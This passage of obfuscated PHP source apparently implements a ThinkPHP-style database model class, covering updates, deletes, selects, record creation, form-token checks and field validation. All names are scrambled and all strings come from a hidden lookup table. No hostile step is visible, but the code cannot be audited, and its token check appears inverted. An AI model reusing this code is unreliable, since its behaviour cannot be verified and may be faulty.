$™¶Èëı˜ = $this->_parseOptions($™¶Èëı˜); $ùËãø—ƒ = $this->getPk(); if (!isset($™¶Èëı˜[$â£µüù[328]])) { if (isset($øİ§£Ç[$ùËãø—ƒ])) { $‡µô‘®–[$ùËãø—ƒ] = $øİ§£Ç[$ùËãø—ƒ]; $™¶Èëı˜[$â£µüù[328]] = $‡µô‘®–; unset($øİ§£Ç[$ùËãø—ƒ]); } else { $this->error = think_lang($â£µüù[327]); return !1; } } if (is_array($™¶Èëı˜[$â£µüù[328]]) && isset($™¶Èëı˜[$â£µüù[328]][$ùËãø—ƒ])) { $‡°ãğ¼Ï = $™¶Èëı˜[$â£µüù[328]][$ùËãø—ƒ]; } if (!1 === $this->_beforeUpdate($øİ§£Ç, $™¶Èëı˜)) { return !1; } $ œŞ¬Á = $this->db->update($øİ§£Ç, $™¶Èëı˜); if (!1 !== $ œŞ¬Á) { if (isset($‡°ãğ¼Ï)) { $øİ§£Ç[$ùËãø—ƒ] = $‡°ãğ¼Ï; } $this->_afterUpdate($øİ§£Ç, $™¶Èëı˜); } return $ œŞ¬Á; } protected function _beforeUpdate(&$™õíöô, $ª°¤øïî) { } protected function _afterUpdate($˜à¶æìœ, $Œü€–¨) { } public function delete($ÈÏ÷Ø¸ã = array()) { $İÉæê¯‚ =& $_SERVER[–Ú¬çÁ]; if (empty($ÈÏ÷Ø¸ã) && empty($this->options[$İÉæê¯‚[328]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $•ú ¨íî = $this->getPk(); if (is_numeric($ÈÏ÷Ø¸ã) || is_string($ÈÏ÷Ø¸ã)) { if (strpos($ÈÏ÷Ø¸ã, $İÉæê¯‚[50])) { $Üˆä‹ïö[$•ú ¨íî] = array($İÉæê¯‚[329], $ÈÏ÷Ø¸ã); } else { $Üˆä‹ïö[$•ú ¨íî] = $ÈÏ÷Ø¸ã; } $this->options[$İÉæê¯‚[328]] = $Üˆä‹ïö; } $ÈÏ÷Ø¸ã = $this->_parseOptions(); if (is_array($ÈÏ÷Ø¸ã[$İÉæê¯‚[328]]) && isset($ÈÏ÷Ø¸ã[$İÉæê¯‚[328]][$•ú ¨íî])) { $À¡ÃÛÁ‘ = $ÈÏ÷Ø¸ã[$İÉæê¯‚[328]][$•ú ¨íî]; } $öÄÏâ´ = $this->db->delete($ÈÏ÷Ø¸ã); if (!1 !== $öÄÏâ´) { $¢¼ÊøÇñ = array(); if (isset($À¡ÃÛÁ‘)) { $¢¼ÊøÇñ[$•ú ¨íî] = $À¡ÃÛÁ‘; } $this->_after_delete($¢¼ÊøÇñ, $ÈÏ÷Ø¸ã); } return $öÄÏâ´; } protected function _after_delete($ÛƒĞŠ‹¦, $ŒÛ¨ÖöÁ) { } public function select($ĞØ¥÷š = array()) { $æ«·â’³ =& $_SERVER[–Ú¬çÁ]; if (is_string($ĞØ¥÷š) || is_numeric($ĞØ¥÷š)) { $ŸĞŒ½Â = $this->getPk(); if (strpos($ĞØ¥÷š, $æ«·â’³[50])) { $ô¼ğ¶´[$ŸĞŒ½Â] = array($æ«·â’³[329], $ĞØ¥÷š); } else { $ô¼ğ¶´[$ŸĞŒ½Â] = $ĞØ¥÷š; } $this->options[$æ«·â’³[328]] = $ô¼ğ¶´; } elseif (!1 === $ĞØ¥÷š) { $ĞØ¥÷š = $this->_parseOptions(); return $æ«·â’³[330] . $this->db->buildSelectSql($ĞØ¥÷š) . $æ«·â’³[331]; } $ĞØ¥÷š = $this->_parseOptions(); $í”§íÈË = $this->db->select($ĞØ¥÷š); if (!1 === $í”§íÈË) { return !1; } if (empty($í”§íÈË)) { return null; } $this->_afterSelect($í”§íÈË, $ĞØ¥÷š); return $í”§íÈË; } protected function _afterSelect(&$±°¿ôÄÏ, $¢¿€‚ßÚ) { } public function buildSql($Ü•…åŒ  = array()) { $ õµ¡¯Ÿ =& $_SERVER[–Ú¬çÁ]; $Ü•…åŒ  = $this->_parseOptions($Ü•…åŒ ); return $ õµ¡¯Ÿ[330] . $this->db->buildSelectSql($Ü•…åŒ ) . $ õµ¡¯Ÿ[331]; } public function optionsValue($˜ö¬Êè = null) { if (is_null($˜ö¬Êè)) { return $this->options; } elseif (is_array($˜ö¬Êè)) { $this->options = array_merge($this->options, $˜ö¬Êè); } } protected function _parseOptions($ÙÔÔÔĞ = array()) { $éÄÖÀı =& $_SERVER[–Ú¬çÁ]; if (is_array($ÙÔÔÔĞ)) { $ÙÔÔÔĞ = array_merge($this->options, $ÙÔÔÔĞ); } $this->options = array(); if (!isset($ÙÔÔÔĞ[$éÄÖÀı[332]])) { $ÙÔÔÔĞ[$éÄÖÀı[332]] = $this->getTableName(); $ˆíÏîÚ = $this->fields; } else { $ˆíÏîÚ = $this->getDbFields(); } if (!empty($ÙÔÔÔĞ[$éÄÖÀı[333]])) { $ÙÔÔÔĞ[$éÄÖÀı[332]] .= $éÄÖÀı[53] . $ÙÔÔÔĞ[$éÄÖÀı[333]]; } $ÙÔÔÔĞ[$éÄÖÀı[334]] = $this->name; if (isset($ÙÔÔÔĞ[$éÄÖÀı[328]]) && is_array($ÙÔÔÔĞ[$éÄÖÀı[328]]) && !empty($ˆíÏîÚ) && !isset($ÙÔÔÔĞ[$éÄÖÀı[335]]) && !isset($ÙÔÔÔĞ[$éÄÖÀı[332]])) { foreach ($ÙÔÔÔĞ[$éÄÖÀı[328]] as $„¨¢éÅÔ => $¼Ëèô‘) { $„¨¢éÅÔ = trim($„¨¢éÅÔ); if (in_array($„¨¢éÅÔ, $ˆíÏîÚ, !0)) { if (is_scalar($¼Ëèô‘)) { $this->_parseType($ÙÔÔÔĞ[$éÄÖÀı[328]], $„¨¢éÅÔ); } } elseif (!is_numeric($„¨¢éÅÔ) && $éÄÖÀı[11] != substr($„¨¢éÅÔ, 0, 1) && !1 === strpos($„¨¢éÅÔ, $éÄÖÀı[10]) && !1 === strpos($„¨¢éÅÔ, $éÄÖÀı[313]) && !1 === strpos($„¨¢éÅÔ, $éÄÖÀı[336]) && !1 === strpos($„¨¢éÅÔ, $éÄÖÀı[337])) { unset($ÙÔÔÔĞ[$éÄÖÀı[328]][$„¨¢éÅÔ]); } } } $this->_options_filter($ÙÔÔÔĞ); return $ÙÔÔÔĞ; } protected function _options_filter(&$ıÁØ­Š) { } protected function _parseType(&$ûÁşó°ƒ, $æÑ´Âä) { $ÃÖ§ÜÎ‚ =& $_SERVER[–Ú¬çÁ]; if (empty($this->options[$ÃÖ§ÜÎ‚[338]][$ÃÖ§ÜÎ‚[4] . $æÑ´Âä])) { $æş¬Êúœ = strtolower($this->fields[$ÃÖ§ÜÎ‚[305]][$æÑ´Âä]); if (!1 !== strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[339])) { } elseif (!1 === strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[340]) && !1 !== strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[341])) { $ûÁşó°ƒ[$æÑ´Âä] = intval($ûÁşó°ƒ[$æÑ´Âä]); } elseif (!1 !== strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[342]) || !1 !== strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[343])) { $ûÁşó°ƒ[$æÑ´Âä] = floatval($ûÁşó°ƒ[$æÑ´Âä]); } elseif (!1 !== strpos($æş¬Êúœ, $ÃÖ§ÜÎ‚[344])) { $ûÁşó°ƒ[$æÑ´Âä] = (bool) $ûÁşó°ƒ[$æÑ´Âä]; } } } public function find($™òùÁå¨ = array()) { $¼à¤Â˜™ =& $_SERVER[–Ú¬çÁ]; if (is_numeric($™òùÁå¨) || is_string($™òùÁå¨)) { $øÓÖ˜Æ[$this->getPk()] = intval($™òùÁå¨); $this->options[$¼à¤Â˜™[328]] = $øÓÖ˜Æ; } $this->options[$¼à¤Â˜™[345]] = 1; $™òùÁå¨ = $this->_parseOptions(); $ô’ßğÌ´ = $this->db->select($™òùÁå¨); if (!1 === $ô’ßğÌ´) { return !1; } if (empty($ô’ßğÌ´)) { return null; } $this->data = $ô’ßğÌ´[0]; $this->_afterFind($this->data, $™òùÁå¨); if (!empty($this->options[$¼à¤Â˜™[346]])) { return $this->returnResult($this->data, $this->options[$¼à¤Â˜™[346]]); } return $this->data; } protected function _afterFind(&$èúØÕ›Ò, $Ÿ†ïŞß›) { } protected function returnResult($Ï³‹ÈáŞ, $ÕÖ‹« = '') { $Ïäû¯µ =& $_SERVER[–Ú¬çÁ]; if ($ÕÖ‹«) { if (is_callable($ÕÖ‹«)) { return call_user_func($ÕÖ‹«, $Ï³‹ÈáŞ); } switch (strtolower($ÕÖ‹«)) { case $Ïäû¯µ[347]: return json_encode($Ï³‹ÈáŞ); case $Ïäû¯µ[348]: return xml_encode($Ï³‹ÈáŞ); } } return $Ï³‹ÈáŞ; } public function parseFieldsMap($Öù‘‹¼Ã, $‡Å‚çø½ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $×çš•¶Ù => $²şËöĞ™) { if ($‡Å‚çø½ == 1) { if (isset($Öù‘‹¼Ã[$²şËöĞ™])) { $Öù‘‹¼Ã[$×çš•¶Ù] = $Öù‘‹¼Ã[$²şËöĞ™]; unset($Öù‘‹¼Ã[$²şËöĞ™]); } } else { if (isset($Öù‘‹¼Ã[$×çš•¶Ù])) { $Öù‘‹¼Ã[$²şËöĞ™] = $Öù‘‹¼Ã[$×çš•¶Ù]; unset($Öù‘‹¼Ã[$×çš•¶Ù]); } } } } return $Öù‘‹¼Ã; } public function setField($‡ôÓõŸ, $ÃĞ‚Õ¶ = '') { if (is_array($‡ôÓõŸ)) { $ß©Êš¤ú = $‡ôÓõŸ; } else { $ß©Êš¤ú[$‡ôÓõŸ] = $ÃĞ‚Õ¶; } return $this->save($ß©Êš¤ú); } public function setAdd($¸æÕğÏç, $ã£Ü¥çÖ = 1) { $íó¿¦Êğ =& $_SERVER[–Ú¬çÁ]; $€óá•ì = $¸æÕğÏç . $íó¿¦Êğ[349] . $ã£Ü¥çÖ; if ($ã£Ü¥çÖ < 0) { $€óá•ì = $¸æÕğÏç . $ã£Ü¥çÖ; } return $this->setField($¸æÕğÏç, array($íó¿¦Êğ[350], $€óá•ì)); } public function getField($¡Øèïˆ, $Ø¬£‚âæ = null) { $Œ¬û¯ã» =& $_SERVER[–Ú¬çÁ]; $Ş·Å‘÷õ[$Œ¬û¯ã»[326]] = $¡Øèïˆ; $Ş·Å‘÷õ = $this->_parseOptions($Ş·Å‘÷õ); $¡Øèïˆ = trim($¡Øèïˆ); if (strpos($¡Øèïˆ, $Œ¬û¯ã»[50])) { if (!isset($Ş·Å‘÷õ[$Œ¬û¯ã»[345]])) { $Ş·Å‘÷õ[$Œ¬û¯ã»[345]] = is_numeric($Ø¬£‚âæ) ? $Ø¬£‚âæ : $Œ¬û¯ã»[12]; } $¬‡™èÃÜ = $this->db->select($Ş·Å‘÷õ); if (!empty($¬‡™èÃÜ)) { $ğƒØÙ› = explode($Œ¬û¯ã»[50], $¡Øèïˆ); $¡Øèïˆ = array_keys($¬‡™èÃÜ[0]); $ÂË¡ŒïÂ = array_shift($¡Øèïˆ); $ş’ƒÉÉÎ = array_shift($¡Øèïˆ); $›ë¸ïºÓ = array(); $êò…ÚÀ = count($ğƒØÙ›); foreach ($¬‡™èÃÜ as $Ü–ü‡å) { $ÀÉÖİ¨æ = $Ü–ü‡å[$ÂË¡ŒïÂ]; if (2 == $êò…ÚÀ) { $›ë¸ïºÓ[$ÀÉÖİ¨æ] = $Ü–ü‡å[$ş’ƒÉÉÎ]; } else { $›ë¸ïºÓ[$ÀÉÖİ¨æ] = is_string($Ø¬£‚âæ) ? implode($Ø¬£‚âæ, $Ü–ü‡å) : $Ü–ü‡å; } } return $›ë¸ïºÓ; } } else { if (!0 !== $Ø¬£‚âæ) { $Ş·Å‘÷õ[$Œ¬û¯ã»[345]] = is_numeric($Ø¬£‚âæ) ? $Ø¬£‚âæ : 1; } if ($Ø¬£‚âæ === $Œ¬û¯ã»[308]) { unset($Ş·Å‘÷õ[$Œ¬û¯ã»[345]]); } $Ü–ü‡å = $this->db->select($Ş·Å‘÷õ); if (!empty($Ü–ü‡å)) { if ($Ø¬£‚âæ === $Œ¬û¯ã»[308]) { return reset($Ü–ü‡å[0]); } if (!0 !== $Ø¬£‚âæ && 1 == $Ş·Å‘÷õ[$Œ¬û¯ã»[345]]) { return reset($Ü–ü‡å[0]); } foreach ($Ü–ü‡å as $˜Ò¢ñĞß) { $ÆÙŸ”„Ê[] = $˜Ò¢ñĞß[$¡Øèïˆ]; } return $ÆÙŸ”„Ê; } } return null; } public function create($¡Ù¼ØÜ£ = '', $²¸˜ŒÛ = '') { $·§ÖÀ¥ =& $_SERVER[–Ú¬çÁ]; if (empty($¡Ù¼ØÜ£)) { $¡Ù¼ØÜ£ = $_POST; } elseif (is_object($¡Ù¼ØÜ£)) { $¡Ù¼ØÜ£ = get_object_vars($¡Ù¼ØÜ£); } if (empty($¡Ù¼ØÜ£) || !is_array($¡Ù¼ØÜ£)) { $this->error = think_lang($·§ÖÀ¥[324]); return !1; } $¡Ù¼ØÜ£ = $this->parseFieldsMap($¡Ù¼ØÜ£, 0); $²¸˜ŒÛ = $²¸˜ŒÛ ? $²¸˜ŒÛ : (!empty($¡Ù¼ØÜ£[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$·§ÖÀ¥[326]])) { $Œ™üö½‘ = $this->options[$·§ÖÀ¥[326]]; unset($this->options[$·§ÖÀ¥[326]]); } elseif ($²¸˜ŒÛ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Œ™üö½‘ = $this->insertFields; } elseif ($²¸˜ŒÛ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Œ™üö½‘ = $this->updateFields; } if (isset($Œ™üö½‘)) { if (is_string($Œ™üö½‘)) { $Œ™üö½‘ = explode($·§ÖÀ¥[50], $Œ™üö½‘); } if (think_config($·§ÖÀ¥[351])) { $Œ™üö½‘[] = think_config($·§ÖÀ¥[352]); } foreach ($¡Ù¼ØÜ£ as $ÃÈ¾Ü‡ => $±øÏØù) { if (!in_array($ÃÈ¾Ü‡, $Œ™üö½‘)) { unset($¡Ù¼ØÜ£[$ÃÈ¾Ü‡]); } } } if (!$this->autoValidation($¡Ù¼ØÜ£, $²¸˜ŒÛ)) { return !1; } if (!$this->autoCheckToken($¡Ù¼ØÜ£)) { $this->error = think_lang($·§ÖÀ¥[353]); return !1; } if ($this->autoCheckFields) { $Œ™üö½‘ = $this->getDbFields(); foreach ($¡Ù¼ØÜ£ as $ÃÈ¾Ü‡ => $±øÏØù) { if (!in_array($ÃÈ¾Ü‡, $Œ™üö½‘)) { unset($¡Ù¼ØÜ£[$ÃÈ¾Ü‡]); } elseif (MAGIC_QUOTES_GPC && is_string($±øÏØù)) { $¡Ù¼ØÜ£[$ÃÈ¾Ü‡] = stripslashes($±øÏØù); } } } $this->autoOperation($¡Ù¼ØÜ£, $²¸˜ŒÛ); $this->data = $¡Ù¼ØÜ£; return $¡Ù¼ØÜ£; } public function autoCheckToken($íïû—ã€) { $ÆÏ”¾µ =& $_SERVER[–Ú¬çÁ]; if (isset($this->options[$ÆÏ”¾µ[354]]) && !$this->options[$ÆÏ”¾µ[354]]) { return !0; } if (think_config($ÆÏ”¾µ[351])) { $Â§áŒƒó = think_config($ÆÏ”¾µ[352]); if (!isset($íïû—ã€[$Â§áŒƒó]) || Session::get($Â§áŒƒó)) { return !1; } list($ã©Éôò€, $¦â€øèã) = explode($ÆÏ”¾µ[11], $íïû—ã€[$Â§áŒƒó]); if ($¦â€øèã && Session::get($Â§áŒƒó . $ÆÏ”¾µ[10] . $ã©Éôò€) === $¦â€øèã) { Session::remove($Â§áŒƒó . $ÆÏ”¾µ[10] . $ã©Éôò€); return !0; } if (think_config($ÆÏ”¾µ[355])) { Session::remove($Â§áŒƒó . $ÆÏ”¾µ[10] . $ã©Éôò€); } return !1; } return !0; } public function regex($ ãÔ³ô, $–şıÏÆÃ) { $ßƒ‘óŒ™ =& $_SERVER[–Ú¬çÁ]; $±ìîÌ– = array($ßƒ‘óŒ™[356] => $ßƒ‘óŒ™[357], $ßƒ‘óŒ™[358] => $ßƒ‘óŒ™[359], $ßƒ‘óŒ™[360] => $ßƒ‘óŒ™[361], $ßƒ‘óŒ™[362] => $ßƒ‘óŒ™[363], $ßƒ‘óŒ™[364] => $ßƒ‘óŒ™[365], $ßƒ‘óŒ™[366] => $ßƒ‘óŒ™[367], $ßƒ‘óŒ™[368] => $ßƒ‘óŒ™[369], $ßƒ‘óŒ™[343] => $ßƒ‘óŒ™[370], $ßƒ‘óŒ™[371] => $ßƒ‘óŒ™[372]); if (isset($±ìîÌ–[strtolower($–şıÏÆÃ)])) { $–şıÏÆÃ = $±ìîÌ–[strtolower($–şıÏÆÃ)]; } return preg_match($–şıÏÆÃ, $ ãÔ³ô) === 1; } private function autoOperation(&$İË±¿î¬, $½²ª¾ƒ) { $úöÁªşá =& $_SERVER[–Ú¬çÁ]; if (!empty($this->options[$úöÁªşá[373]])) { $ŸÈ¯ûœÒ = $this->options[$úöÁªşá[373]]; unset($this->options[$úöÁªşá[373]]); } elseif (!empty($this->_auto)) { $ŸÈ¯ûœÒ = $this->_auto; } if (isset($ŸÈ¯ûœÒ)) { foreach ($ŸÈ¯ûœÒ as $§âƒôä÷) { if (empty($§âƒôä÷[2])) { $§âƒôä÷[2] = THINK_MODEL_INSERT; } if ($½²ª¾ƒ == $§âƒôä÷[2] || $§âƒôä÷[2] == THINK_MODEL_BOTH) { switch (trim($§âƒôä÷[3])) { case $úöÁªşá[374]: case $úöÁªşá[375]: $¶“ışÑ = isset($§âƒôä÷[4]) ? (array) $§âƒôä÷[4] : array(); if (isset($İË±¿î¬[$§âƒôä÷[0]])) { array_unshift($¶“ışÑ, $İË±¿î¬[$§âƒôä÷[0]]); } if ($úöÁªşá[374] == $§âƒôä÷[3]) { $İË±¿î¬[$§âƒôä÷[0]] = call_user_func_array($§âƒôä÷[1], $¶“ışÑ); } else { $İË±¿î¬[$§âƒôä÷[0]] = call_user_func_array(array(&$this, $§âƒôä÷[1]), $¶“ışÑ); } break; case $úöÁªşá[326]: $İË±¿î¬[$§âƒôä÷[0]] = $İË±¿î¬[$§âƒôä÷[1]]; break; case $úöÁªşá[376]: if ($úöÁªşá[12] === $İË±¿î¬[$§âƒôä÷[0]]) { unset($İË±¿î¬[$§âƒôä÷[0]]); } break; case $úöÁªşá[377]: default: $İË±¿î¬[$§âƒôä÷[0]] = $§âƒôä÷[1]; } if (!1 === $İË±¿î¬[$§âƒôä÷[0]]) { unset($İË±¿î¬[$§âƒôä÷[0]]); } } } } return $İË±¿î¬; } protected function autoValidation($»¶“÷—™, $ğÔ³Óó›) { $İ³åßÑ½ =& $_SERVER[–Ú¬çÁ]; if (!empty($this->options[$İ³åßÑ½[378]])) { $ãğæü¨ = $this->options[$İ³åßÑ½[378]]; unset($this->options[$İ³åßÑ½[378]]); } elseif (!empty($this->_validate)) { $ãğæü¨ = $this->_validate; } if (isset($ãğæü¨)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ãğæü¨ as $àîƒÉï => $Ÿéìœ«) { if (empty($Ÿéìœ«[5]) || $Ÿéìœ«[5] == THINK_MODEL_BOTH || $Ÿéìœ«[5] == $ğÔ³Óó›) { if (0 == strpos($Ÿéìœ«[2], $İ³åßÑ½[379]) && strpos($Ÿéìœ«[2], $İ³åßÑ½[380])) { $Ÿéìœ«[2] = think_lang(substr($Ÿéìœ«[2], 2, -1)); } $Ÿéìœ«[3] = isset($Ÿéìœ«[3]) ? $Ÿéìœ«[3] : THINK_EXISTS_VALIDATE; $Ÿéìœ«[4] = isset($Ÿéìœ«[4]) ? $Ÿéìœ«[4] : $İ³åßÑ½[381]; switch ($Ÿéìœ«[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($»¶“÷—™, $Ÿéìœ«)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($İ³åßÑ½[12] != trim($»¶“÷—™[$Ÿéìœ«[0]])) { if (!1 === $this->_validationField($»¶“÷—™, $Ÿéìœ«)) { return !1; } } break; default: if (isset($»¶“÷—™[$Ÿéìœ«[0]])) { if (!1 === $this->_validationField($»¶“÷—™, $Ÿéìœ«)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($öğ–˜Íí, $‹¨¶ıËí) { if (!1 === $this->_validationFieldItem($öğ–˜Íí, $‹¨¶ıËí)) { if ($this->patchValidate) { $this->error[$‹¨¶ıËí[0]] = $‹¨¶ıËí[2]; } else { $this->error = $‹¨¶ıËí[2]; return !1; } } return; } protected function _validationFieldItem($‚¹ºè¹ƒ, $Í½ ®×Å) { $Ÿ•«¢¼Ô =& $_SERVER[–Ú¬çÁ]; switch (strtolower(trim($Í½ ®×Å[4]))) { case $Ÿ•«¢¼Ô[374]: case $Ÿ•«¢¼Ô[375]: $¦’×ù÷¼ = isset($Í½ ®×Å[6]) ? (array) $Í½ ®×Å[6] : array(); if (is_string($Í½ ®×Å[0]) && strpos($Í½ ®×Å[0], $Ÿ•«¢¼Ô[50])) { $Í½ ®×Å[0] = explode($Ÿ•«¢¼Ô[50], $Í½ ®×Å[0]); } if (is_array($Í½ ®×Å[0])) { foreach ($Í½ ®×Å[0] as $ô¦ÈüáÊ) { $âÜ¿â¯[$ô¦ÈüáÊ] = $‚¹ºè¹ƒ[$ô¦ÈüáÊ]; } array_unshift($¦’×ù÷¼, $âÜ¿â¯); } else { array_unshift($¦’×ù÷¼, $‚¹ºè¹ƒ[$Í½ ®×Å[0]]); } if ($Ÿ•«¢¼Ô[374] == $Í½ ®×Å[4]) { return call_user_func_array($Í½ ®×Å[1], $¦’×ù÷¼); } else { return call_user_func_array(array(&$this, $Í½ ®×Å[1]), $¦’×ù÷¼); } case $Ÿ•«¢¼Ô[382]: return $‚¹ºè¹ƒ[$Í½ ®×Å[0]] == $‚¹ºè¹ƒ[$Í½ ®×Å[1]]; case $Ÿ•«¢¼Ô[383]: if (is_string($Í½ ®×Å[0]) && strpos($Í½ ®×Å[0], $Ÿ•«¢¼Ô[50])) { $Í½ ®×Å[0] = explode($Ÿ•«¢¼Ô[50], $Í½ ®×Å[0]); } $ ÇòÌÎ = array(); if (is_array($Í½ ®×Å[0])) { foreach ($Í½ ®×Å[0] as $ô¦ÈüáÊ) { $ ÇòÌÎ[$ô¦ÈüáÊ] = $‚¹ºè¹ƒ[$ô¦ÈüáÊ]; } } else { $ ÇòÌÎ[$Í½ ®×Å[0]] = $‚¹ºè¹ƒ[$Í½ ®×Å[0]]; } if (!empty($‚¹ºè¹ƒ[$this->getPk()])) { $ ÇòÌÎ[$this->getPk()] = array($Ÿ•«¢¼Ô[384], $‚¹ºè¹ƒ[$this->getPk()]); } if ($this->where($ ÇòÌÎ)->find()) { return !1; } return !0; default: return $this->check($‚¹ºè¹ƒ[$Í½ ®×Å[0]], $Í½ ®×Å[1], $Í½ ®×Å[4]); } } public function check($Ş’Ö®ó’, $êÓÈ¯ë¬, $ª´ú£–Æ = "\162\x65\x67\145\x78") { $«Í”Ï¿Ô =& $_SERVER[–Ú¬çÁ]; $ª´ú£–Æ = strtolower(trim($ª´ú£–Æ)); switch ($ª´ú£–Æ) { case $«Í”Ï¿Ô[7]: case $«Í”Ï¿Ô[385]: $Ï¹Å„ = is_array($êÓÈ¯ë¬) ? $êÓÈ¯ë¬ : explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬); return $ª´ú£–Æ == $«Í”Ï¿Ô[7] ? in_array($Ş’Ö®ó’, $Ï¹Å„) : !in_array($Ş’Ö®ó’, $Ï¹Å„); case $«Í”Ï¿Ô[386]: case $«Í”Ï¿Ô[387]: if (is_array($êÓÈ¯ë¬)) { $™Š»ıŸŸ = $êÓÈ¯ë¬[0]; $È†ÍïºÊ = $êÓÈ¯ë¬[1]; } else { list($™Š»ıŸŸ, $È†ÍïºÊ) = explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬); } return $ª´ú£–Æ == $«Í”Ï¿Ô[386] ? $Ş’Ö®ó’ >= $™Š»ıŸŸ && $Ş’Ö®ó’ <= $È†ÍïºÊ : $Ş’Ö®ó’ < $™Š»ıŸŸ || $Ş’Ö®ó’ > $È†ÍïºÊ; case $«Í”Ï¿Ô[388]: case $«Í”Ï¿Ô[389]: return $ª´ú£–Æ == $«Í”Ï¿Ô[388] ? $Ş’Ö®ó’ == $êÓÈ¯ë¬ : $Ş’Ö®ó’ != $êÓÈ¯ë¬; case $«Í”Ï¿Ô[390]: $’åšöÊ = mb_strlen($Ş’Ö®ó’, $«Í”Ï¿Ô[391]); if (strpos($êÓÈ¯ë¬, $«Í”Ï¿Ô[50])) { list($™Š»ıŸŸ, $È†ÍïºÊ) = explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬); return $’åšöÊ >= $™Š»ıŸŸ && $’åšöÊ <= $È†ÍïºÊ; } else { return $’åšöÊ == $êÓÈ¯ë¬; } case $«Í”Ï¿Ô[392]: list($Ÿ­™äÄó, $Òƒ¦÷–) = explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬); if (!is_numeric($Ÿ­™äÄó)) { $Ÿ­™äÄó = strtotime($Ÿ­™äÄó); } if (!is_numeric($Òƒ¦÷–)) { $Òƒ¦÷– = strtotime($Òƒ¦÷–); } return NOW_TIME >= $Ÿ­™äÄó && NOW_TIME <= $Òƒ¦÷–; case $«Í”Ï¿Ô[393]: return in_array(get_client_ip(), explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬)); case $«Í”Ï¿Ô[394]: return !in_array(get_client_ip(), explode($«Í”Ï¿Ô[50], $êÓÈ¯ë¬)); case $«Í”Ï¿Ô[381]: default: return $this->regex($Ş’Ö®ó’, $êÓÈ¯ë¬); } } public function query($¬ã‡¬°, $³Ô“µÓ = false) { $¡ç”‰¶ =& $_SERVER[–Ú¬çÁ]; if (!is_bool($³Ô“µÓ) && !is_array($³Ô“µÓ)) { $³Ô“µÓ = func_get_args(); array_shift($³Ô“µÓ); } $¬ã‡¬° = str_replace(array($¡ç”‰¶[206], $¡ç”‰¶[395]), $¡ç”‰¶[53], $¬ã‡¬°); $¬ã‡¬° = $this->parseSql($¬ã‡¬°, $³Ô“µÓ); return $this->db->query($¬ã‡¬°); } public function execute($ÃÅúšãÒ, $ËõÌÜ¾¿ = false) { if (!is_bool($ËõÌÜ¾¿) && !is_array($ËõÌÜ¾¿)) { $ËõÌÜ¾¿ = func_get_args(); array_shift($ËõÌÜ¾¿); } $ÃÅúšãÒ = $this->parseSql($ÃÅúšãÒ, $ËõÌÜ¾¿); return $this->db->execute($ÃÅúšãÒ); } protected function parseSql($ª«Ö‹, $í£şÖ„Ñ) { $œÜŸËœ£ =& $_SERVER[–Ú¬çÁ]; if (!0 === $í£şÖ„Ñ) { $òáŸ¡‰ = $this->_parseOptions(); $ª«Ö‹ = $this->db->parseSql($ª«Ö‹, $òáŸ¡‰); } elseif (is_array($í£şÖ„Ñ)) { $í£şÖ„Ñ = array_map(array($this->db, $œÜŸËœ£[396]), $í£şÖ„Ñ); $ª«Ö‹ = vsprintf($ª«Ö‹, $í£şÖ„Ñ); } else { $ª«Ö‹ = strtr($ª«Ö‹, array($œÜŸËœ£[397] => $this->getTableName(), $œÜŸËœ£[398] => think_config($œÜŸËœ£[297]))); } $this->db->setModel($this->name); return $ª«Ö‹; } public function db($¥èŒ©´ = '', $è†½ÜŒÕ = '', $ñ‰›ºçš = array()) { $Şº¾ûÌ =& $_SERVER[–Ú¬çÁ]; if ($Şº¾ûÌ[12] === $¥èŒ©´ && $this->db) { return $this->db; } static $Ğµ‚„Ë = array(); static $ÃÄıØÆŞ = array(); if (!isset($ÃÄıØÆŞ[$¥èŒ©´]) || isset($ÃÄıØÆŞ[$¥èŒ©´]) && $è†½ÜŒÕ && $Ğµ‚„Ë[$¥èŒ©´] != $è†½ÜŒÕ) { if (!empty($è†½ÜŒÕ) && is_string($è†½ÜŒÕ) && !1 === strpos($è†½ÜŒÕ, $Şº¾ûÌ[8])) { $è†½ÜŒÕ = think_config($è†½ÜŒÕ); } $¥èŒ©´ = think_guid($è†½ÜŒÕ); $ÃÄıØÆŞ[$¥èŒ©´] = Db::getInstance($è†½ÜŒÕ); } elseif (NULL === $è†½ÜŒÕ) { $ÃÄıØÆŞ[$¥èŒ©´]->close(); unset($ÃÄıØÆŞ[$¥èŒ©´]); return; } if (!empty($ñ‰›ºçš)) { if (is_string($ñ‰›ºçš)) { parse_str($ñ‰›ºçš, $ñ‰›ºçš); } foreach ($ñ‰›ºçš as $Ü¾ù÷€ => $üõÇ˜£¸) { $this->setProperty($Ü¾ù÷€, $üõÇ˜£¸); } } $Ğµ‚„Ë[$¥èŒ©´] = $è†½ÜŒÕ; $this->db = $ÃÄıØÆŞ[$¥èŒ©´]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ª Ô¥áÖ = get_class($this); if ($ª Ô¥áÖ == $_SERVER[–Ú¬çÁ][399]) { return $this->name; } $this->name = substr($ª Ô¥áÖ, 0, -5); } return $this->name; } public function getTableName() { $†¨¸üöü =& $_SERVER[–Ú¬çÁ]; if (empty($this->trueTableName)) { $š×Õû = !empty($this->tablePrefix) ? $this->tablePrefix : $†¨¸üöü[12]; if (!empty($this->tableName)) { $š×Õû .= $this->tableName; } else { $š×Õû .= think_parse_name($this->name); } $this->trueTableName = strtolower($š×Õû); } return (!empty($this->dbName) ? $this->dbName . $†¨¸üöü[10] : $†¨¸üöü[12]) . 